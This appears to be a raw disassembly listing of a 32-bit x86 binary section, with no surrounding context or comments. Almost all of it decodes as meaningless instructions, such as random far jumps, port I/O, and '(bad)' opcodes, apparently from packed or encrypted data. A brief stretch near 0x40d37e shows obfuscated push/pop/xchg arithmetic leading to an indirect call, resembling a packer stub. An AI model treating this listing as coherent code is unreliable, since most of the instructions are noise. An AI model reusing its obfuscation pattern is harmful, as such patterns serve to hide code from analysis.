  40cf38:	jp     0x40cf13
  40cf3a:	xor    BYTE PTR [esi-0x3a],al
  40cf3d:	jecxz  0x40cf6e
  40cf3f:	mov    dh,0x44
  40cf41:	iret   
  40cf42:	sbb    BYTE PTR [edi+0x540f084c],ah
  40cf48:	in     al,0xf5
  40cf4a:	adc    DWORD PTR [ebx],eax
  40cf4c:	icebp  
  40cf4d:	dec    edi
  40cf4e:	jbe    0x40ceff
  40cf50:	call   0x6e70:0x4e0afb57
  40cf57:	mov    bl,0x2b
  40cf59:	sbb    cl,BYTE PTR [eax-0x1a]
  40cf5c:	sbb    BYTE PTR [edi+0x1b0e566d],ah
  40cf62:	fdivp  st(0),st
  40cf64:	or     esi,DWORD PTR [ebp+esi*4-0x40]
  40cf68:	sbb    al,ch
  40cf6a:	imul   ebp,DWORD PTR [esp+edx*2],0xffffffd6
  40cf6e:	push   es
  40cf6f:	enter  0xf985,0xd0
  40cf73:	xor    eax,0xffa16a49
  40cf78:	fxch   st(1)
  40cf7a:	cmp    ebp,DWORD PTR fs:[edi+0x7aae487b]
  40cf81:	add    cl,BYTE PTR [ecx-0x7121a76f]
  40cf87:	nop
  40cf88:	pop    eax
  40cf89:	jmp    0x1d2d004f
  40cf8e:	gs cmp al,0x51
  40cf91:	or     dl,BYTE PTR [ecx-0x2d]
  40cf94:	in     eax,dx
  40cf95:	jmp    0x40d011
  40cf97:	cli    
  40cf98:	mov    edi,0xa2a93711
  40cf9d:	bound  esp,QWORD PTR [edx-0x6b626147]
  40cfa3:	xor    DWORD PTR [esp+ecx*4+0x6ebf622],eax
  40cfaa:	inc    edi
  40cfab:	stos   DWORD PTR es:[edi],eax
  40cfac:	dec    edx
  40cfad:	mov    esi,0xfb0c19b2
  40cfb2:	es loop 0x40cfd7
  40cfb5:	mov    ds,WORD PTR [ebx-0x494aad84]
  40cfbb:	mov    edi,0xef0d9c4b
  40cfc0:	add    BYTE PTR [eax-0x41],dl
  40cfc3:	pop    es
  40cfc4:	inc    esp
  40cfc5:	dec    esp
  40cfc6:	mov    ebp,0x4fb9ea5f
  40cfcb:	jg     0x40d022
  40cfcd:	rcr    DWORD PTR [esi-0x1b],cl
  40cfd0:	in     al,dx
  40cfd1:	add    esp,DWORD PTR [ecx+0x70d6e002]
  40cfd7:	cdq    
  40cfd8:	fs add esp,eax
  40cfdb:	not    DWORD PTR [ebp+eiz*1-0x50]
  40cfdf:	dec    ebx
  40cfe0:	dec    esi
  40cfe1:	push   edx
  40cfe2:	cs daa 
  40cfe4:	jmp    0xfbc4:0x216cabb7
  40cfeb:	(bad)  
  40cfec:	cld    
  40cfed:	iret   
  40cfee:	js     0x40cfda
  40cff0:	mov    dh,0xdd
  40cff2:	and    ecx,DWORD PTR [edx]
  40cff4:	push   0x433dedf2
  40cff9:	es push cs
  40cffb:	push   edx
  40cffc:	dec    ebp
  40cffd:	push   0x39
  40cfff:	out    dx,al
  40d000:	shl    DWORD PTR [esi-0x43784766],0xf9
  40d007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d008:	mov    DWORD PTR [edx+eax*2-0x25],eax
  40d00c:	les    esi,FWORD PTR [ecx-0x36]
  40d00f:	jle    0x40d024
  40d011:	in     eax,0x1
  40d013:	test   al,0x49
  40d015:	ja     0x40d03e
  40d017:	sbb    bl,dl
  40d019:	pusha  
  40d01a:	mov    edi,0xc7eb7c0f
  40d01f:	and    DWORD PTR [ebx],eax
  40d021:	mov    bh,0x59
  40d023:	out    0xb8,eax
  40d025:	mov    cl,0xf0
  40d027:	ror    BYTE PTR [ebp-0x1880755d],0x2c
  40d02e:	imul   ebp,DWORD PTR [edi+0x27f8481c],0xffffffe9
  40d035:	mov    dh,bl
  40d037:	push   di
  40d039:	xchg   edx,eax
  40d03a:	ss gs xchg ebp,eax
  40d03d:	inc    esi
  40d03e:	out    dx,al
  40d03f:	stos   BYTE PTR es:[edi],al
  40d040:	aaa    
  40d041:	jns    0x40cfdb
  40d043:	(bad)  
  40d044:	out    dx,eax
  40d045:	cli    
  40d046:	in     eax,dx
  40d047:	cmp    eax,0xe082a6f4
  40d04c:	repnz and ebp,DWORD PTR [ebp+0x2f]
  40d050:	(bad)  
  40d051:	fwait
  40d052:	xor    al,0x74
  40d054:	cmp    al,0x5c
  40d056:	out    0xaf,al
  40d058:	arpl   WORD PTR [ebp-0x4b],bp
  40d05b:	mov    ds:0x52233f7a,al
  40d060:	jb     0x75151876
  40d066:	and    DWORD PTR [eax+0xc20d857],0x8f5e2025
  40d070:	mov    ah,0xd0
  40d072:	shl    BYTE PTR [ecx-0x2a],1
  40d075:	div    DWORD PTR [ecx-0x65b5b7d3]
  40d07b:	adc    DWORD PTR [ebx+ebp*4-0x4bbaaaa9],0xffffffb4
  40d083:	pop    esi
  40d084:	div    BYTE PTR [esi-0x7252ed1c]
  40d08a:	jle    0x40d0bc
  40d08c:	xor    dl,BYTE PTR [ebx+0x2fe17eac]
  40d092:	jp     0x40d047
  40d094:	cmp    eax,0x9469cfe9
  40d099:	stc    
  40d09a:	push   ecx
  40d09b:	xchg   ecx,eax
  40d09c:	xchg   edx,eax
  40d09d:	mul    BYTE PTR ds:0xf01b1dad
  40d0a3:	rcl    BYTE PTR [esi],0xd0
  40d0a6:	push   0xffffffc5
  40d0a8:	adc    ecx,DWORD PTR [esi+0x5b]
  40d0ab:	xchg   edx,ebp
  40d0ad:	(bad)  
  40d0ae:	mul    DWORD PTR [edx+0x3e]
  40d0b1:	xchg   ecx,eax
  40d0b2:	cs xchg edi,eax
  40d0b4:	add    al,0xf4
  40d0b6:	(bad)  
  40d0b7:	cmp    DWORD PTR [edx+0x77],ebx
  40d0ba:	inc    ebp
  40d0bb:	(bad)  
  40d0bc:	retf   
  40d0bd:	fnstenv [edi]
  40d0bf:	retf   0x8686
  40d0c2:	jmp    0xee0e:0x27162200
  40d0c9:	aas    
  40d0ca:	lock pop ecx
  40d0cc:	mov    DWORD PTR [ebp+0x2c],esi
  40d0cf:	das    
  40d0d0:	fldenv [ebx+0x62]
  40d0d3:	clc    
  40d0d4:	aas    
  40d0d5:	mov    ebp,0x9afcb56c
  40d0db:	popf   
  40d0dc:	nop
  40d0dd:	pop    es
  40d0de:	jne    0x40d07d
  40d0e0:	jne    0x40d0e5
  40d0e2:	mov    ah,0xe2
  40d0e4:	mov    ch,0x30
  40d0e6:	data16 sbb bh,cl
  40d0e9:	sahf   
  40d0ea:	jo     0x40d08b
  40d0ec:	stos   BYTE PTR es:[edi],al
  40d0ed:	ucomiss xmm5,DWORD PTR [ecx-0x3f]
  40d0f1:	(bad)
  40d0f4:	test   al,0x3a
  40d0f6:	js     0x40d141
  40d0f8:	ror    dh,0xe6
  40d0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0fc:	sub    al,0xf8
  40d0fe:	jmp    0x40d14e
  40d100:	aam    0x6f
  40d102:	or     eax,0xc8eb33b9
  40d107:	into   
  40d108:	xchg   ebp,eax
  40d109:	std    
  40d10a:	daa    
  40d10b:	jl     0x40d0fe
  40d10d:	push   edx
  40d10e:	sbb    al,0x66
  40d110:	cmp    dl,BYTE PTR [edx]
  40d112:	adc    DWORD PTR [eax+0x8],ecx
  40d115:	xor    ecx,esi
  40d117:	push   ebp
  40d118:	add    eax,0xb9cf413f
  40d11d:	jno    0x40d145
  40d11f:	pop    eax
  40d120:	lods   eax,DWORD PTR ds:[esi]
  40d121:	dec    edi
  40d122:	cwde   
  40d123:	mov    bl,0x40
  40d125:	jg     0x40d0c8
  40d127:	int    0xa3
  40d129:	cld    
  40d12a:	inc    edx
  40d12b:	push   ecx
  40d12c:	jp     0x40d0de
  40d12e:	jmp    0xec5:0x893d1d8b
  40d135:	es fwait
  40d137:	or     al,0x82
  40d139:	jne    0x40d0ee
  40d13b:	sub    bh,al
  40d13d:	mov    ds:0x59397580,eax
  40d142:	pop    eax
  40d143:	icebp  
  40d144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d145:	fs rcl ebx,1
  40d148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d149:	loope  0x40d114
  40d14b:	inc    esp
  40d14c:	fucomi st,st(1)
  40d14e:	mov    ds:0xfc8db2c7,eax
  40d153:	daa    
  40d154:	ins    DWORD PTR es:[edi],dx
  40d155:	mov    eax,ds:0xb23bf31b
  40d15a:	xor    al,0xc7
  40d15c:	in     eax,0xa9
  40d15e:	(bad)  
  40d15f:	enter  0xa164,0x62
  40d163:	jle    0x40d133
  40d165:	xor    DWORD PTR [edi-0x31],ebp
  40d168:	imul   ecx,DWORD PTR [ecx+0x1],0x5f1d0dc5
  40d16f:	pop    eax
  40d170:	lods   al,BYTE PTR ds:[esi]
  40d171:	mov    cl,al
  40d173:	imul   edi,ecx,0x6
  40d176:	fwait
  40d177:	sub    eax,0x19826b80
  40d17c:	fnstsw WORD PTR [edi+0x8]
  40d17f:	dec    ebp
  40d180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d181:	pop    eax
  40d182:	outs   dx,BYTE PTR ds:[esi]
  40d183:	ins    DWORD PTR es:[edi],dx
  40d184:	scas   al,BYTE PTR es:[edi]
  40d185:	gs aad 0xfb
  40d188:	inc    edi
  40d189:	push   es
  40d18a:	mov    edx,esi
  40d18c:	lds    ebp,FWORD PTR [edx+0xede8572]
  40d192:	jmp    0xef34:0xafae77da
  40d199:	xor    bh,cl
  40d19b:	gs xchg esi,eax
  40d19d:	loop   0x40d1fa
  40d19f:	ss pop es
  40d1a1:	call   0xe615eb73
  40d1a6:	fnstsw ax
  40d1a8:	jns    0x40d1b0
  40d1aa:	mov    bh,0x9c
  40d1ac:	mov    ecx,ss
  40d1ae:	dec    ecx
  40d1af:	popa   
  40d1b0:	jecxz  0x40d177
  40d1b2:	addr16 inc edi
  40d1b4:	add    DWORD PTR gs:[edx],edx
  40d1b7:	into   
  40d1b8:	idiv   BYTE PTR [edx+0x51]
  40d1bb:	outs   dx,DWORD PTR ds:[esi]
  40d1bc:	std    
  40d1bd:	jle    0x40d15b
  40d1bf:	or     esp,DWORD PTR [ecx-0x3fcd9356]
  40d1c5:	xchg   BYTE PTR [eax+0x6d],ah
  40d1c8:	aas    
  40d1c9:	push   cs
  40d1ca:	lock mov ah,0x6c
  40d1cd:	or     al,0x2b
  40d1cf:	inc    eax
  40d1d0:	mov    BYTE PTR [eax+0x31970092],0xd4
  40d1d7:	xchg   edx,eax
  40d1d8:	sub    BYTE PTR [esi+0x65],al
  40d1db:	xchg   esp,eax
  40d1dc:	cmp    eax,0xf23ed05f
  40d1e1:	pop    edi
  40d1e2:	dec    ebx
  40d1e3:	mov    esi,0xc1fd7f20
  40d1e8:	mov    dl,0xe3
  40d1ea:	out    dx,al
  40d1eb:	lds    edi,FWORD PTR [ebx+0x39]
  40d1ee:	repnz cld 
  40d1f0:	test   eax,0x91d569b4
  40d1f5:	mov    DWORD PTR [ebx-0x1b],edx
  40d1f8:	ja     0x40d23b
  40d1fa:	or     dl,BYTE PTR [ebx+0x5a]
  40d1fd:	lods   eax,DWORD PTR ds:[esi]
  40d1fe:	shl    BYTE PTR [ecx-0x38a30a76],cl
  40d204:	stos   BYTE PTR es:[edi],al
  40d205:	imul   DWORD PTR [edx]
  40d207:	pop    ebx
  40d208:	(bad)  
  40d209:	cmp    al,0x3c
  40d20b:	shl    dh,1
  40d20d:	dec    ebx
  40d20e:	out    dx,eax
  40d20f:	xor    cl,BYTE PTR [ebx+0x113d320a]
  40d215:	out    dx,eax
  40d216:	loope  0x40d287
  40d218:	cmp    DWORD PTR [edi],eax
  40d21a:	adc    al,0xa8
  40d21c:	mov    ecx,0xe6820e92
  40d221:	jmp    0x40d263
  40d223:	mov    ebp,0x618b008b
  40d228:	in     eax,0xd3
  40d22a:	call   0xa9a2:0x40d8f192
  40d231:	dec    ebx
  40d232:	push   eax
  40d233:	cmp    edx,DWORD PTR [edi-0x50]
  40d236:	mov    eax,ebx
  40d238:	sar    esp,1
  40d23a:	mov    edx,0xa07656c6
  40d23f:	cs lahf 
  40d241:	test   eax,0xdf8760d8
  40d246:	retf   0xa4df
  40d249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d24a:	and    BYTE PTR [ebx+0x72],0xd7
  40d24e:	xor    DWORD PTR [edx-0x18d7399f],esi
  40d254:	add    bx,WORD PTR [eax-0x60f5e357]
  40d25b:	stc    
  40d25c:	hlt    
  40d25d:	scas   al,BYTE PTR es:[edi]
  40d25e:	cwde   
  40d25f:	cld    
  40d260:	xchg   ebp,eax
  40d261:	mov    edx,0x77ad9934
  40d266:	cmc    
  40d267:	pop    edi
  40d268:	lahf   
  40d269:	dec    edx
  40d26a:	xchg   ebx,eax
  40d26b:	popa   
  40d26c:	mov    esi,0x255f3dc
  40d271:	dec    ecx
  40d272:	(bad)  
  40d273:	jns    0x40d2e9
  40d275:	xor    eax,0x9c64b957
  40d27a:	sbb    eax,0xbbcc1e34
  40d27f:	cwde   
  40d280:	mov    ebp,0xdbd74530
  40d285:	jge    0x40d28a
  40d287:	fdiv   QWORD PTR [ecx]
  40d289:	adc    BYTE PTR [eax+0x49c2db86],dl
  40d28f:	xor    eax,0xb4f0606b
  40d294:	popa   
  40d295:	add    al,0xa9
  40d297:	loop   0x40d257
  40d299:	repz sbb eax,0xa44d7511
  40d29f:	xor    BYTE PTR [ebp+0x4a],dl
  40d2a2:	dec    ecx
  40d2a3:	inc    ebp
  40d2a4:	xchg   edx,eax
  40d2a5:	mov    cl,0x6b
  40d2a7:	out    0x1,eax
  40d2a9:	jb     0x40d27a
  40d2ab:	in     al,dx
  40d2ac:	out    dx,al
  40d2ad:	popa   
  40d2ae:	rcr    DWORD PTR [edi+0x3a],cl
  40d2b1:	je     0x40d305
  40d2b3:	inc    edx
  40d2b4:	sbb    dl,ch
  40d2b6:	mov    dh,0xb0
  40d2b8:	pop    edi
  40d2b9:	sbb    ebx,DWORD PTR [esi-0x44aa63b5]
  40d2bf:	xor    al,0x4d
  40d2c1:	shr    DWORD PTR [eax*4+0x4f273159],1
  40d2c8:	and    eax,0x25982e53
  40d2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ce:	push   esp
  40d2cf:	addr16 inc ecx
  40d2d1:	in     eax,dx
  40d2d2:	adc    al,0x53
  40d2d4:	dec    edx
  40d2d5:	pop    edi
  40d2d6:	imul   eax,DWORD PTR [edx+ebx*4],0x72b67aaa
  40d2dd:	xor    al,0x6f
  40d2df:	jmp    0x40d30d
  40d2e1:	jno    0x40d2a7
  40d2e3:	add    eax,0x3bf1eee0
  40d2e8:	in     eax,0xf3
  40d2ea:	dec    ebx
  40d2eb:	pop    ss
  40d2ec:	add    al,0x34
  40d2ee:	div    BYTE PTR [ecx+0x48]
  40d2f1:	jne    0x40d2a8
  40d2f3:	cmp    DWORD PTR [edx-0x8],0xf8657149
  40d2fa:	pop    edi
  40d2fb:	jl     0x40d33c
  40d2fd:	scas   al,BYTE PTR es:[edi]
  40d2fe:	loopne 0x40d358
  40d300:	mov    esi,0x3c560e4a
  40d305:	pop    edi
  40d306:	ins    DWORD PTR es:[edi],dx
  40d307:	js     0x40d2cb
  40d309:	sahf   
  40d30a:	inc    ebx
  40d30b:	sbb    eax,0x48275aa0
  40d310:	add    ch,BYTE PTR [ecx]
  40d312:	inc    eax
  40d313:	jl     0x40d2a0
  40d315:	fwait
  40d316:	loopne 0x40d334
  40d318:	mov    ch,BYTE PTR [edx+0x2c3fc913]
  40d31e:	sub    al,0xb8
  40d320:	in     eax,0x33
  40d322:	pop    es
  40d323:	mov    ds:0xd245a4b2,eax
  40d328:	pop    es
  40d329:	xchg   esi,eax
  40d32a:	imul   edi,eax,0xffffffbe
  40d32d:	mov    esp,0x9fd3269a
  40d332:	popa   
  40d333:	daa    
  40d334:	push   ds
  40d335:	pushf  
  40d336:	mov    edi,0x1ea2742
  40d33b:	lock inc ebp
  40d33d:	cwde   
  40d33e:	cmp    eax,0xccd4417c
  40d343:	in     al,dx
  40d344:	aas    
  40d345:	out    dx,eax
  40d346:	adc    BYTE PTR [ecx+0x2510c021],bl
  40d34c:	pop    edi
  40d34d:	out    0xba,al
  40d34f:	(bad)  
  40d350:	cmp    esi,DWORD PTR [edx-0x2145df69]
  40d356:	or     bh,bl
  40d358:	pop    eax
  40d359:	outs   dx,BYTE PTR ds:[esi]
  40d35a:	and    al,0xac
  40d35c:	pusha  
  40d35d:	aas    
  40d35e:	gs cs (bad) 
  40d362:	jb     0x40d300
  40d364:	fisub  DWORD PTR [eax-0x7a]
  40d367:	push   ss
  40d368:	mov    cl,0x1d
  40d36a:	daa    
  40d36b:	stc    
  40d36c:	call   0xf5634112
  40d371:	scas   eax,DWORD PTR es:[edi]
  40d372:	mov    dl,0x5d
  40d374:	stos   DWORD PTR es:[edi],eax
  40d375:	(bad)  
  40d376:	es mov es,WORD PTR gs:[edi+0x4697b7e1]
  40d37e:	add    ebx,0x1002
  40d384:	lea    eax,[ebp-0x18]
  40d387:	add    edx,eax
  40d389:	add    edx,0x5
  40d38c:	push   edx
  40d38d:	inc    esi
  40d38e:	pop    ecx
  40d38f:	dec    ecx
  40d390:	xchg   ecx,eax
  40d391:	dec    eax
  40d392:	xchg   ecx,eax
  40d393:	dec    ecx
  40d394:	xchg   ecx,edx
  40d396:	dec    edx
  40d397:	push   edx
  40d398:	mov    edx,ebx
  40d39a:	pop    ebx
  40d39b:	dec    ebx
  40d39c:	call   DWORD PTR [ebx]
  40d39e:	cmp    DWORD PTR [ebp+0x10],esi
  40d3a1:	je     0x40f754
  40d3a7:	xchg   edx,eax
  40d3a8:	push   0xc
  40d3aa:	pop    ecx
  40d3ab:	dec    ecx
  40d3ac:	push   0x3
  40d3ae:	pop    ebx
  40d3af:	inc    ebx
  40d3b0:	xchg   ebx,ecx
  40d3b2:	inc    ecx
  40d3b3:	sub    ebx,ecx
  40d3b5:	xchg   ebx,ecx
  40d3b7:	dec    ecx
  40d3b8:	dec    ecx
  40d3b9:	mov    eax,DWORD PTR [ebp-0x1c]
  40d3bc:	imul   eax,ecx
  40d3bf:	jmp    0x40f751
  40d3c4:	inc    eax
  40d3c5:	sbb    edx,DWORD PTR [ebp-0x1e]
  40d3c8:	push   edx
  40d3c9:	mov    ds:0x35198590,al
  40d3ce:	aad    0x91
  40d3d0:	loope  0x40d3a7
  40d3d2:	fidivr WORD PTR [edx-0x4e]
  40d3d5:	rol    DWORD PTR [ebx-0x7ca1f37d],cl
  40d3db:	cmp    DWORD PTR [ecx],0xffffff92
  40d3de:	jae    0x40d427
  40d3e0:	les    edx,FWORD PTR [edx]
  40d3e2:	xchg   DWORD PTR [ebx],edi
  40d3e4:	in     al,0x21
  40d3e6:	jle    0x40d40d
  40d3e8:	mov    edi,0x11f05da3
  40d3ed:	push   eax
  40d3ee:	fstp   QWORD PTR [edi+0x23]
  40d3f1:	mov    eax,0x502da098
  40d3f6:	sbb    edi,DWORD PTR [edx]
  40d3f8:	int    0x88
  40d3fa:	and    bh,BYTE PTR [ebx+ebp*4+0x4]
  40d3fe:	aas    
  40d3ff:	jo     0x40d45a
  40d401:	ins    BYTE PTR es:[edi],dx
  40d402:	rcr    esp,0x25
  40d405:	and    dh,ah
  40d407:	cli    
  40d408:	mov    ds:0xa2f64b4d,al
  40d40d:	jb     0x40d39e
  40d40f:	mov    ebx,edx
  40d411:	push   edi
  40d412:	and    eax,0x1d1f7268
  40d417:	repz push esp
  40d419:	test   al,0x31
  40d41b:	cmp    ah,BYTE PTR [ecx+0x5f]
  40d41e:	es pop edi
  40d420:	xlat   BYTE PTR ds:[ebx]
  40d421:	jno    0x40d3b1
  40d423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d424:	mov    eax,0x822497f1
  40d429:	rcr    BYTE PTR [ebx],cl
  40d42b:	shl    cl,0x28
  40d42e:	fidivr DWORD PTR [edx-0x3]
  40d431:	add    esp,DWORD PTR [eax]
  40d433:	mov    eax,ds:0xcb73695e
  40d438:	mov    al,ds:0x32f666b9
  40d43d:	sbb    DWORD PTR [ecx+0x40],edi
  40d440:	lods   eax,DWORD PTR ds:[esi]
  40d441:	fiadd  WORD PTR [ebx-0x4272a188]
  40d447:	push   eax
  40d448:	minps  xmm4,XMMWORD PTR ds:[eax-0xd]
  40d44d:	stc    
  40d44e:	adc    edi,esp
  40d450:	add    eax,0xfd660a64
  40d455:	shl    DWORD PTR [edi-0x2a],1
  40d458:	sbb    eax,0xd1375435
  40d45d:	leave  
  40d45e:	fmul   QWORD PTR [edi+0x0]
  40d461:	sub    eax,0x8e4467b6
  40d466:	cdq    
  40d467:	inc    ebp
  40d468:	pop    ecx
  40d469:	test   DWORD PTR cs:[edi+eax*1+0x7ef4d4f4],esi
  40d471:	push   0xfffffff2
  40d473:	push   ecx
  40d474:	jns    0x40d463
  40d476:	cmp    eax,0x6c3fa610
  40d47b:	ret    0x803f
  40d47e:	ret    0xfbbd
  40d481:	jno    0x40d456
  40d483:	pop    eax
  40d484:	jmp    DWORD PTR [esi]
  40d486:	or     eax,0xa985a0bd
  40d48b:	mov    edi,0x89c64268
  40d490:	jge    0x40d50a
  40d492:	neg    dh
  40d494:	dec    edx
  40d495:	mov    ds:0x26344bf0,eax
  40d49a:	cmp    bl,ch
  40d49c:	fist   WORD PTR [esi+0x160ddff]
  40d4a2:	mov    ch,0xbc
  40d4a4:	dec    edx
  40d4a5:	inc    ecx
  40d4a6:	inc    edi
  40d4a7:	cmp    al,0x66
  40d4a9:	jno    0x40d4d8
  40d4ab:	pop    edi
  40d4ac:	jmp    0x40d435
  40d4ae:	call   0xff1a:0x1100fe02
  40d4b5:	cmp    cl,BYTE PTR [esi-0x69fc3b36]
  40d4bb:	imul   eax,edi,0xffffffcf
  40d4be:	ss push ebx
  40d4c0:	jb     0x40d531
  40d4c2:	push   eax
  40d4c3:	adc    BYTE PTR [edi-0x11fa5ed0],ah
  40d4c9:	loope  0x40d47f
  40d4cb:	dec    ebp
  40d4cc:	adc    BYTE PTR [ecx+0x7feab01d],al
  40d4d2:	push   ss
  40d4d3:	rep stos DWORD PTR es:[edi],eax
  40d4d5:	mov    DWORD PTR [ecx+eiz*1],0xebae5fe1
  40d4dc:	clc    
  40d4dd:	int    0x9a
  40d4df:	pushf  
  40d4e0:	sbb    BYTE PTR ds:0xab4da9d5,bh
  40d4e6:	cli    
  40d4e7:	lahf   
  40d4e8:	xor    al,0x55
  40d4ea:	outs   dx,DWORD PTR ds:[esi]
  40d4eb:	pop    ebp
  40d4ec:	popa   
  40d4ed:	fwait
  40d4ee:	repnz dec esp
  40d4f0:	or     BYTE PTR [esi-0x2c],dl
  40d4f3:	arpl   WORD PTR [eax+esi*4],bx
  40d4f6:	rcl    DWORD PTR [edx+edx*1+0x47688dbe],0xe9
  40d4fe:	pop    esi
  40d4ff:	jmp    0x40d488
  40d501:	xchg   ebp,eax
  40d502:	sbb    eax,DWORD PTR [eax-0x170e8198]
  40d508:	sbb    eax,0x4ea3bc7b
  40d50d:	imul   ecx,DWORD PTR [esi+0x288c26da],0xffffffeb
  40d514:	push   edx
  40d515:	adc    DWORD PTR [eax+0x45],ecx
  40d518:	mov    dh,0xff
  40d51a:	jns    0x40d4b4
  40d51c:	in     eax,dx
  40d51d:	dec    ebx
  40d51e:	out    0x60,al
  40d520:	sbb    ch,dl
  40d522:	xchg   ebp,eax
  40d523:	pop    ebp
  40d524:	in     eax,0x96
  40d526:	add    BYTE PTR [ebp-0x26871b84],0xe2
  40d52d:	jmp    0x40d4f1
  40d52f:	hlt    
  40d530:	and    BYTE PTR [esp+eiz*4-0x5607b687],cl
  40d537:	and    al,0x76
  40d539:	jnp    0x40d4d2
  40d53b:	push   ebp
  40d53c:	inc    esi
  40d53d:	or     ch,bh
  40d53f:	push   edi
  40d540:	push   cs
  40d541:	adc    esi,DWORD PTR [eax+0x66]
  40d544:	mov    bh,0x53
  40d546:	call   0x14c9ce63
  40d54b:	icebp  
  40d54c:	xchg   edi,eax
  40d54d:	mov    bh,0x84
  40d54f:	repz sbb ebp,DWORD PTR [ecx+0x2930f1e2]
  40d556:	xor    BYTE PTR [eax],dh
  40d558:	nop
  40d559:	hlt    
  40d55a:	inc    eax
  40d55b:	out    0x10,eax
  40d55d:	(bad)  
  40d55f:	repz arpl WORD PTR [ecx],bp
  40d562:	(bad)
  40d565:	cs inc ebx
  40d567:	dec    esp
  40d568:	pop    es
  40d569:	sbb    edx,DWORD PTR [edx-0x50]
  40d56c:	jmp    0x48676bd7
  40d571:	fwait
  40d572:	mov    dl,BYTE PTR [esp+edi*8]
  40d575:	adc    DWORD PTR [eax+0x6904d105],esp
  40d57b:	dec    ebp
  40d57c:	enter  0xbeb5,0xd6
  40d580:	je     0x40d52a
  40d582:	and    ebx,edi
  40d584:	ds dec edx
  40d586:	lea    ecx,[edi]
  40d588:	and    DWORD PTR [eax+0x5f1d62c7],0xa757c763
  40d592:	push   esp
  40d593:	lods   al,BYTE PTR ds:[esi]
  40d594:	je     0x40d51d
  40d596:	imul   edx,DWORD PTR [ebx-0x586644e1],0x24
  40d59d:	das    
  40d59e:	adc    edx,ecx
  40d5a0:	cdq    
  40d5a1:	mov    bh,0xd0
  40d5a3:	mov    ch,0x1c
  40d5a5:	loopne 0x40d603
  40d5a7:	dec    esp
  40d5a8:	dec    edx
  40d5a9:	inc    esp
  40d5aa:	mov    dl,0xea
  40d5ac:	push   ebx
  40d5ad:	inc    edi
  40d5ae:	and    BYTE PTR [ebp-0x2f652531],ah
  40d5b4:	fsubr  DWORD PTR [esi-0x2e313fcc]
  40d5ba:	sub    eax,0x2e99738f
  40d5bf:	js     0x40d560
  40d5c1:	cs jne 0x40d5b9
  40d5c4:	pop    eax
  40d5c5:	dec    DWORD PTR [eax+0x35ec5556]
  40d5cb:	mov    edx,0x493c94d
  40d5d0:	and    dh,BYTE PTR [ebx+0x6e9c3eda]
  40d5d6:	mul    DWORD PTR [edx+0x1e]
  40d5d9:	(bad)  [edi]
  40d5db:	mov    edi,0x92513daf
  40d5e0:	repz ja 0x40d5c5
  40d5e3:	or     BYTE PTR [edx+edi*8],bh
  40d5e6:	cld    
  40d5e7:	loop   0x40d621
  40d5e9:	mov    edx,0x86967544
  40d5ee:	shl    BYTE PTR [ebp-0x42],1
  40d5f1:	push   0xe50a515a
  40d5f6:	std    
  40d5f7:	and    esi,DWORD PTR [esi]
  40d5f9:	and    BYTE PTR [esi+0x4437c1b4],dh
  40d5ff:	xchg   esi,eax
  40d600:	fld    DWORD PTR [eax]
  40d602:	and    eax,0x7fa35ce7
  40d607:	jno    0x40d5de
  40d609:	popf   
  40d60a:	and    DWORD PTR [edi],edx
  40d60c:	lea    eax,[eax]
  40d60e:	pop    eax
  40d60f:	inc    ecx
  40d610:	icebp  
  40d611:	cmp    ecx,eax
  40d613:	fild   WORD PTR [edi]
  40d615:	xor    DWORD PTR ss:[edx-0x176d9c01],ebp
  40d61c:	shl    ecx,1
  40d61e:	stos   BYTE PTR es:[edi],al
  40d61f:	cwde   
  40d620:	jne    0x40d650
  40d622:	(bad)  
  40d623:	jne    0x40d5bd
  40d625:	add    eax,0x78b176e4
  40d62a:	push   es
  40d62b:	bound  eax,QWORD PTR [ecx+ebx*1]
  40d62e:	xchg   BYTE PTR [ebp+0x587cd052],ah
  40d634:	jp     0x40d69e
  40d636:	inc    esp
  40d637:	ds retf 
  40d639:	adc    al,0xbf
  40d63b:	outs   dx,DWORD PTR ds:[esi]
  40d63c:	gs mov eax,0x6797d4e8
  40d642:	test   eax,0xd651e576
  40d647:	(bad)  
  40d648:	fld    QWORD PTR [eax+0x2f]
  40d64b:	adc    al,0x23
  40d64d:	push   0xe8617145
  40d652:	or     dh,BYTE PTR [edx+0x68]
  40d655:	mov    DWORD PTR [ebp+0x0],eax
  40d658:	jmp    0xc9ffd51e
  40d65d:	retw   0x8d35
  40d661:	cdq    
  40d662:	xor    eax,0xb690fc03
  40d667:	inc    esi
  40d668:	fnstsw WORD PTR [edi-0x24]
  40d66b:	in     eax,dx
  40d66c:	mov    cl,BYTE PTR [eax-0x29]
  40d66f:	pop    esp
  40d671:	cdq    
  40d672:	fcmovnb st,st(0)
  40d674:	(bad)  
  40d675:	test   al,0x9e
  40d677:	outs   dx,DWORD PTR ds:[esi]
  40d678:	and    DWORD PTR [esi+0xfc56523],esp
  40d67e:	cli    
  40d67f:	dec    eax
  40d680:	xchg   esi,eax
  40d681:	ret    0xdb95
  40d684:	push   edi
  40d685:	xor    eax,0x5badfd7
  40d68a:	rcl    BYTE PTR [ebx],cl
  40d68c:	test   BYTE PTR ss:[eax-0x1b4736ba],cl
  40d693:	mov    ds:0xdfba54f8,al
  40d698:	sbb    ebp,edi
  40d69a:	mov    edx,0x1d8c3ae5
  40d69f:	push   0xffffffe1
  40d6a1:	std    
  40d6a2:	jle    0x40d658
  40d6a4:	cmc    
  40d6a5:	jmp    0x40d709
  40d6a7:	or     al,0x87
  40d6a9:	int    0xbc
  40d6ab:	dec    esi
  40d6ac:	ja     0x40d63f
  40d6ae:	mov    al,0x2
  40d6b0:	fild   DWORD PTR [edx+0x69d52141]
  40d6b6:	stos   DWORD PTR es:[edi],eax
  40d6b7:	jo     0x40d642
  40d6b9:	xor    ebp,DWORD PTR [edx]
  40d6bb:	pop    DWORD PTR [ebx-0x1737d315]
  40d6c1:	mov    al,ds:0xfcfdc607
  40d6c6:	cmc    
  40d6c7:	sub    eax,0x2bfe0ee5
  40d6cc:	mov    esp,es
  40d6ce:	xchg   ecx,edx
  40d6d0:	in     eax,0xaf
  40d6d2:	js     0x40d6c6
  40d6d4:	xor    DWORD PTR [esp+edi*4],ebp
